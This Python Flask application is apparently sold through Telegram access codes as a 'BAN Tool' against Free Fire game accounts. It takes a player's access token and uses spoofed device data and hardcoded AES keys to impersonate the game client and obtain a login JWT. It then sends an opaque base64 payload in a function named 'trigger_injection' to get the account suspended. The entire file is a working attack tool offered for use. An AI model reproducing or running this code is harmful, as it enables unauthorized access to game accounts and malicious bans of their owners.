import os
import sys
import json
import time
import uuid
import base64
import threading
import requests
import urllib3
from datetime import datetime, timedelta

# Ensure workspace dir is on path so protobuf modules can be imported
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

urllib3.disable_warnings()

from flask import Flask, request, jsonify, render_template, send_from_directory

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("pycryptodome missing")
    sys.exit(1)

try:
    import MajoRLogin_pb2 as mLpB
    import MajorLoginRes_pb2 as mLrPb
except ImportError:
    print("protobuf files missing")
    sys.exit(1)

app = Flask(__name__, static_folder='static', template_folder='templates')

# ====================================================================
# KNA TRI - Access Code System (2 Hour Validity)
# ====================================================================
ACCESS_CODE_DURATION = 2 * 60 * 60  # 2 hours in seconds
# Pre-generated valid access codes (each valid for 2 hours from first use)
VALID_CODES = {
    "KNA-TRI-2K25-X7R9": {"used_at": None, "expires_at": None},
    "KNA-TRI-2K25-M4Q8": {"used_at": None, "expires_at": None},
    "KNA-TRI-2K25-P3W6": {"used_at": None, "expires_at": None},
    "KNA-TRI-2K25-Z1T5": {"used_at": None, "expires_at": None},
    "KNA-TRI-2K25-L8N2": {"used_at": None, "expires_at": None},
}
active_sessions = {}  # session_id -> expiry timestamp
code_lock = threading.Lock()

def validate_access_code(code):
    """Validate access code. Returns (valid, session_id, message)."""
    with code_lock:
        code = code.strip().upper()
        if code not in VALID_CODES:
            return False, None, "Invalid access code. Contact @knatri77 on Telegram."

        entry = VALID_CODES[code]
        now = time.time()

        # First use - start the 2-hour countdown
        if entry["used_at"] is None:
            entry["used_at"] = now
            entry["expires_at"] = now + ACCESS_CODE_DURATION

        # Check if expired
        if now > entry["expires_at"]:
            return False, None, "Access code expired. Codes are valid for 2 hours only."

        session_id = str(uuid.uuid4())
        active_sessions[session_id] = entry["expires_at"]
        remaining = int(entry["expires_at"] - now)
        return True, session_id, f"Access granted. Valid for {remaining//3600}h {(remaining%3600)//60}m."

def check_session(session_id):
    """Check if a session is still valid."""
    if not session_id:
        return False
    expiry = active_sessions.get(session_id)
    if not expiry:
        return False
    if time.time() > expiry:
        active_sessions.pop(session_id, None)
        return False
    return True

# ====================================================================
# BAN Tool Core Logic (adapted from app.py)
# ====================================================================
BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV  = b'6oyZDr22E3ychjM%'
mLuRl  = "https://loginbp.ggpolarbear.com/MajorLogin"

mLhDr  = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1",
    "ReleaseVersion": "OB54"
}

def decode_ff_name(b64_str):
    try:
        if not b64_str: return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name else "Unknown"
    except Exception:
        return "Unknown"

def enc(d):
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))

def dec(d):
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def build_majorlogin(tok, open_id, p_type):
    m = mLpB.MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.120.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def fetch_majorlogin_jwt(tok):
    if tok.startswith("ey") and "." in tok:
        return tok, None

    oId = None
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}", headers={"User-Agent": "Mozilla/5.0"}, timeout=10).json()
        oId = r.get("open_id")
    except Exception:
        pass

    if not oId:
        try:
            uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", headers=uid_headers, verify=False, timeout=10).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post("https://topup.pk/api/auth/player_id_login", headers={"Content-Type": "application/json"}, json={"app_id": 100067, "login_id": str(uid)}, verify=False, timeout=10).json()
                oId = openid_res.get("open_id")
        except Exception:
            pass

    if not oId:
        return None, "Failed to extract Open ID. Token is invalid or expired."

    platforms = [8, 3, 4, 6]
    for p_type in platforms:
        pl = build_majorlogin(tok, oId, p_type)
        try:
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=15, verify=False)
            if x.status_code == 200:
                res = mLrPb.MajorLoginRes()
                try:
                    res.ParseFromString(dec(x.content))
                except Exception:
                    res.ParseFromString(x.content)
                if res.token:
                    return res.token, None
        except Exception:
            continue

    return None, "MajorLogin failed. Account might be blocked or platform mismatch."

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        decoded_str = decoded_bytes.decode('utf-8')
        return json.loads(decoded_str)
    except Exception:
        return {}

def get_base_url(lock_region):
    lock_region = lock_region.upper()
    ind_regions = ["IND"]
    us_regions = ["BR", "US", "NA", "SAC"]
    if lock_region in ind_regions:
        return "https://client.ind.freefiremobile.com"
    elif lock_region in us_regions:
        return "https://client.us.freefiremobile.com"
    else:
        return "https://clientbp.ggpolarbear.com"

def trigger_injection(jwt_token, version, base_url):
    api_url = f"{base_url}/GetLoginData"
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(api_url, headers=headers, data=body, timeout=25, verify=False)

# ====================================================================
# Flask Routes
# ====================================================================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/validate', methods=['POST'])
def api_validate():
    data = request.get_json(force=True)
    code = data.get('code', '')
    valid, session_id, message = validate_access_code(code)
    return jsonify({"valid": valid, "session": session_id, "message": message})

@app.route('/api/execute', methods=['POST'])
def api_execute():
    data = request.get_json(force=True)
    session_id = data.get('session', '')
    token = data.get('token', '').strip()

    if not check_session(session_id):
        return jsonify({"success": False, "error": "Session expired or invalid. Please re-enter your access code."})

    if not token:
        return jsonify({"success": False, "error": "Token cannot be empty."})

    try:
        jwt_token, error_msg = fetch_majorlogin_jwt(token)
        if not jwt_token:
            return jsonify({"success": False, "error": error_msg or "Authentication failed."})

        user_data = decode_jwt(jwt_token)
        raw_nick = user_data.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        region = user_data.get('lock_region', user_data.get('region', 'IND'))
        account_id = user_data.get('account_id', 'Unknown')
        version = user_data.get('release_version', 'Latest')

        base_url = get_base_url(region)

        ban_resp = trigger_injection(jwt_token, version, base_url)

        if ban_resp.status_code == 200:
            return jsonify({
                "success": True,
                "nickname": nickname,
                "account_id": str(account_id),
                "region": region,
                "version": version,
                "status": "SUSPENDED (100%)"
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Server returned status code: {ban_resp.status_code}"
            })
    except requests.exceptions.ConnectionError:
        return jsonify({"success": False, "error": "Internet error. Check network connection."})
    except Exception as e:
        return jsonify({"success": False, "error": f"System error: {str(e)}"})

@app.route('/api/session_check', methods=['POST'])
def api_session_check():
    data = request.get_json(force=True)
    session_id = data.get('session', '')
    valid = check_session(session_id)
    return jsonify({"valid": valid})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8081, debug=False)
